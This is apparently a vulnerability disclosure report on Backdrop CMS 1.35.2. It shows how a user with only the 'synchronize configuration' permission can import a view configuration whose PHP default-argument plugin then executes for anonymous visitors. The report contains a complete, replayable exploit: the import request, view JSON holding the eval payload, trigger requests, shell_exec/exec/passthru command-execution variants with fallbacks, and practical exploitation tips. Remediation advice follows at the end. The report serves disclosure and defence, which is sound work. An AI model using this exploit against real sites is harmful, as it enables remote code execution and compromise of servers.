# Backdrop CMS Configuration Import — Improper Authorization Leading to Remote Code Execution (Vulnerability Report)

> Report ID: BD-RCE-001 | Date: 2026-10-26 | Status: Dynamically verified

## 1. Vulnerability Type

Improper Authorization on a code-execution capability, leading to Remote Code Execution (RCE)

- CWE-863 (Incorrect Authorization), resulting in CWE-94 (Improper Control of Generation of Code)
- CVSS 3.1: **8.8 High** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) — exploitation was verified with a **purpose-built non-administrative role carrying exactly one permission** (`synchronize configuration`); the account had no other administrative capabilities (403 on module, view and system administration; see §5). If a CNA instead classifies `synchronize configuration` itself as an administrative privilege (stock installations grant it only to administrators), PR:H yields 6.6 Medium. The verified privilege-boundary bypass — a capability reserved for `use PHP for settings` obtained with a lesser delegated permission — is the basis for the PR:L assessment.
- Authentication required: **any authenticated user whose role includes `synchronize configuration`** (verified with a role holding only that permission; no FTP/SSH credentials, no `administer software updates`, no writable code directory are needed)

## 2. Affected Product and Download

- **Backdrop CMS 1.35.2** (reproduced on a default installation with default configuration; current release at time of testing, packaged 2026-10-14)
- Official repository: https://github.com/backdrop/backdrop
- Affected release download: https://github.com/backdrop/backdrop/archive/refs/tags/1.35.2.zip (or the 1.35.2 entry at https://github.com/backdrop/backdrop/releases; official installer page https://backdropcms.org/download)
- Vendor homepage: https://backdropcms.org
- Earlier versions were not tested; the involved plugin and import code paths have existed across the 1.x line and are presumed affected.

## 3. Environment Setup (Reference Deployment)

Requirements (per vendor documentation):

- PHP >= 7.1 (a currently supported PHP version recommended), with the `pdo_mysql` and `gd` extensions
- MySQL 5.7+ / MariaDB
- Apache with `mod_rewrite` (the shipped `.htaccess` is sufficient) or Nginx

Steps:

1. Download and extract the 1.35.2 archive (see §2) into the web root.
2. Create a MySQL database, point the browser at the installation wizard `/core/install.php`, and complete it (it creates the schema and the site-maintenance account, uid 1).
3. Log in as the uid 1 account and create the low-privilege test identity used in §5 (all via the UI: `admin/config/people/roles/add`, the permission grid at `admin/people/permissions`, and `admin/people/create`):
   - role `lowpriv_test` with **only** `synchronize configuration` checked (Configuration Management category);
   - user `lowpriv` carrying only that role.

Verification environment used for this report: Backdrop CMS 1.35.2 (default installation, public download method), Apache 2.4.39 + mod_fcgid, PHP 8.2.9, MySQL 5.7.26, Windows.

## 4. Vulnerability Description

The configuration import feature of Backdrop CMS, `POST /admin/config/development/configuration/single/import` (source: `core/modules/config/config.admin.inc:410-493`, `config_import_single_form`), allows writing a `views.view.*` configuration object that persists **attacker-supplied PHP code** into the active configuration store, bypassing the permission that the product itself defines for this capability:

1. **The capability has a dedicated permission gate — but only in the UI.** The core Views module ships a "PHP Code" argument default plugin (`core/modules/views/plugins/views_plugin_argument_default_php.inc`). Configuring it through the Views UI requires `user_access('use PHP for settings')` via the plugin's `access()` method (lines 43-45) — a high-bar permission reserved for the most trusted administrators. The same pattern exists in the "PHP Code" argument validator plugin (`views_plugin_argument_validate_php.inc`).
2. **The import path performs no equivalent check.** Form validation (`config_import_single_form_validate`) only verifies that the JSON parses, that a `_config_name` is present, and — via `config_sync_validate_file()` (`core/modules/config/config.sync.inc:173-235`) — that some enabled module claims the config prefix. The Views module implements **no** config-validation hooks (only `views_config_info()` at `views.module:2149`, which declares prefix ownership), so a contextual filter with `default_argument_type: "php"` and an attacker-controlled `default_argument_options.code` is written as-is to the active store. The full-import pathway (`admin/config/development/configuration/full/import`, config.tar.gz staging + "Import all") is equally affected.
3. **The execution path has no permission check at all.** On submit, `config_sync_file()` writes the config and `backdrop_flush_all_caches()` immediately publishes the view's page route at an attacker-chosen path with `access: none`. The first render — `views_handler_argument::get_default_argument()` (`core/modules/views/handlers/views_handler_argument.inc:801-806`) → `views_plugin_argument_default_php::get_argument()` (line 52) — executes `eval($this->options['code'])`.

Exploitation characteristics: after implantation the payload **persists in the configuration store** (database table / `files/config_*/active/*.json`) rather than as a webshell file on disk, and is executed **by unauthenticated visitors** on every request to the view path (the `/views/ajax` endpoint provides an alternative trigger). The intended boundary — `synchronize configuration` vs. `use PHP for settings` — is therefore not enforced anywhere between import and execution.

## 5. Reproduction Steps

Setup (one-time, performed as uid 1): create the `lowpriv_test` role and `lowpriv` user as described in §3 step 3.

1. Log in as `lowpriv` (role permissions: `synchronize configuration` only) and obtain the session cookie (`SESS<hash>`).
2. **Boundary evidence:** with this session, `GET /admin/structure/views`, `GET /admin/modules` and `GET /admin/config/system` all return **403** — the account holds no module-, view- or system-administration capability, and in particular does **not** hold `use PHP for settings`.
3. `GET /admin/config/development/configuration/single/import` — accessible (200) — and capture the hidden `form_build_id` and `form_token` (the form fields are `import` and `op=Import`).
4. Send the request shown in §6: the JSON view configuration, URL-encoded, as the `import` field.
5. Expect the success message `The views.view.poc_rce configuration was imported successfully.` The import rebuilds the router immediately; no further action is needed.
6. Open an incognito browser (no session) and request `GET /poc-rce`. The response is `200`; the injected PHP has now executed.
7. Request `GET /files/poc_rce.txt` and read the output of the injected code.

Verified results: the entire chain (import → trigger) was completed **exclusively with the `lowpriv` session**. On the reference deployment the marker file contained `LOWPRIV-RCE executed-by-uid=0 os=Windows NT <host> 10.0 build 19045 (Windows 10) AMD64 who=Admin php=8.2.9` — attacker-supplied PHP executed by the web-server process (service account `Admin`), and `executed-by-uid=0` confirms the execution occurred in the **anonymous** request context. After verification the environment was fully restored: the marker file was removed by re-importing an `unlink()` payload through the same low-privilege session and triggering once; the view was deleted via `admin/structure/views/view/poc_rce/delete`, and the test user and role were removed (route 404, user 404, role absent from the roles list).

## 6. Payload

```http
POST /admin/config/development/configuration/single/import HTTP/1.1
Host: <target>
Cookie: SESS<hash>=<session>
Content-Type: application/x-www-form-urlencoded

import=<the JSON below, URL-encoded>&form_id=config_import_single_form&form_build_id=form-XXXX&form_token=XXXX&op=Import
```

View configuration (`import` field value; payload emphasized):

```json
{
    "_config_name": "views.view.poc_rce",
    "name": "poc_rce",
    "description": "poc",
    "storage": 1,
    "tag": "",
    "disabled": false,
    "base_table": "node",
    "human_name": "poc_rce",
    "core": "1.0",
    "display": {
        "default": {
            "display_title": "Master",
            "display_plugin": "default",
            "display_options": {
                "query": { "type": "views_query", "options": [] },
                "access": { "type": "none" },
                "cache": { "type": "none" },
                "exposed_form": { "type": "basic" },
                "pager": { "type": "some", "options": { "items_per_page": "5", "offset": "0" } },
                "style_plugin": "default",
                "row_plugin": "fields",
                "fields": {
                    "title": {
                        "id": "title", "table": "node", "field": "title",
                        "relationship": "none", "group_type": "group",
                        "ui_name": "", "label": "", "exclude": 0,
                        "alter": { "alter_text": 0, "text": "", "make_link": 0 },
                        "element_type": "", "element_class": "",
                        "element_label_type": "", "element_label_class": "",
                        "element_wrapper_type": "", "element_wrapper_class": "",
                        "element_default_classes": 1, "empty": "",
                        "hide_empty": 0, "empty_zero": 0, "hide_alter_empty": 1,
                        "link_to_node": 1
                    }
                },
                "arguments": {
                    "null": {
                        "id": "null", "table": "views", "field": "null",
                        "relationship": "none", "group_type": "group", "ui_name": "",
                        "default_action": "default",
                        "exception": { "title_enable": 0, "title": "All" },
                        "title_enable": 0, "title": "",
                        "default_argument_type": "php",
                        "default_argument_options": {
                            "code": "global $user; file_put_contents('public://poc_rce.txt', 'LOWPRIV-RCE executed-by-uid='.$user->uid.' os='.php_uname().' who='.get_current_user().' php='.PHP_VERSION.' t='.time()); return '1';"
                        },
                        "default_argument_skip_url": 0,
                        "summary_options": { "base_path": "", "count": 1, "items_per_page": "25", "override": 0 },
                        "summary": { "sort_order": "asc", "number_of_records": 0, "format": "default_summary" },
                        "specify_validation": 0,
                        "validate": { "type": "none", "fail": "not found" },
                        "must_not_be": 0
                    }
                },
                "filters": {
                    "status": { "id": "status", "table": "node", "field": "status",
                                "relationship": "none", "group_type": "group", "ui_name": "",
                                "operator": "=", "value": 1, "group": 1,
                                "exposed": false, "expose": { "operator_id": "", "label": "", "description": "" } }
                },
                "sorts": {
                    "created": { "id": "created", "table": "node", "field": "created",
                                 "relationship": "none", "group_type": "group", "order": "DESC" }
                }
            }
        },
        "page_1": {
            "display_title": "Page",
            "display_plugin": "page",
            "display_options": {
                "query": { "type": "views_query", "options": [] },
                "path": "poc-rce",
                "menu": { "type": "none" },
                "tab_options": { "type": "none" }
            }
        }
    }
}
```

Trigger (GET, no session required):

```http
GET /poc-rce HTTP/1.1
Host: <target>
```

```http
GET /files/poc_rce.txt HTTP/1.1
Host: <target>
```

Response body (verified, imported through the low-privilege session and triggered by an anonymous visitor):

```
LOWPRIV-RCE executed-by-uid=0 os=Windows NT <host> 10.0 build 19045 (Windows 10) AMD64 who=Admin php=8.2.9 t=1793000642
```

Command-execution variant (the eval runs inside `ob_start()`/`ob_end_clean()`, so output must be written to a file; note the executing context is the **anonymous** request that triggers the view — `global $user` reports `uid=0`):

> ```php
> file_put_contents('public://cmd.txt', shell_exec("whoami 2>&1")); return '1';
> ```
>
> Fallback payloads (try in order if `shell_exec` is disabled via `disable_functions`):
> ```php
> file_put_contents('public://cmd.txt', exec("whoami 2>&1")); return '1';       // exec (last line)
> file_put_contents('public://cmd.txt', passthru("whoami") . ""); return '1';    // passthru (direct output)
> ```

> Notes: `<target>`, `SESS<hash>` and the form tokens are placeholders. The injected code must **not** use `<?php ?>` tags and must `return` a value. `default_action` must be `"default"` and the trigger URL must carry **no** argument — the default-argument plugin runs only when the contextual filter is absent. Do **not** add a `"module"` key to the JSON: `view::__construct()` (`core/modules/views/includes/view.inc:288-302`) classifies any config carrying `module` as Default/Overridden, which blocks UI deletion of the implanted view afterwards (`VIEWS_STORAGE_NORMAL` = 1 is required; Backdrop constants: `NORMAL=1, OVERRIDE=2, DEFAULT=4`). The validator-plugin variant (`validate.type: "php"` + `validate_options.code`) and `POST /views/ajax` (`view_name=poc_rce&view_display_id=page_1`) are equivalent triggers. Cleanup: re-import the same `_config_name` with `"code": "@unlink('public://poc_rce.txt'); return '1';"`, trigger once, then delete the view at `admin/structure/views/view/poc_rce/delete`.

## 7. Remediation

1. **Enforce the permission at execution time (root fix).** In `views_plugin_argument_default_php::get_argument()` and `views_plugin_argument_validate_php` (or centrally in the `views_plugin_argument::get_plugin()` factory), refuse to instantiate/execute "PHP Code" plugins unless `user_access('use PHP for settings')` holds for the executing request, and log a watchdog warning when such a plugin is encountered without the permission.
2. **Validate on the import path.** Implement `hook_config_create_validate` / `hook_config_update_validate` in the Views module, rejecting any `views.view.*` configuration that references the `php` argument default/validator plugins unless the importing user holds `use PHP for settings`.
3. **Make PHP plugins visible in the sync UI.** Flag configurations containing PHP plugin code in the configuration-synchronization diff as defense-in-depth.
4. **Site-level mitigations until a fix ships.** Restrict `synchronize configuration` to roles that also hold `use PHP for settings`; audit existing configurations for compromise indicators — `views.view.*` entries containing `"default_argument_type": "php"` or a `php` validator with non-empty `code` (active store: `files/config_*/active/*.json` or the `config` database table).

---

*This report was produced from dynamically verified testing in an authorized lab environment; all requests can be replayed as-is in Burp Repeater.*
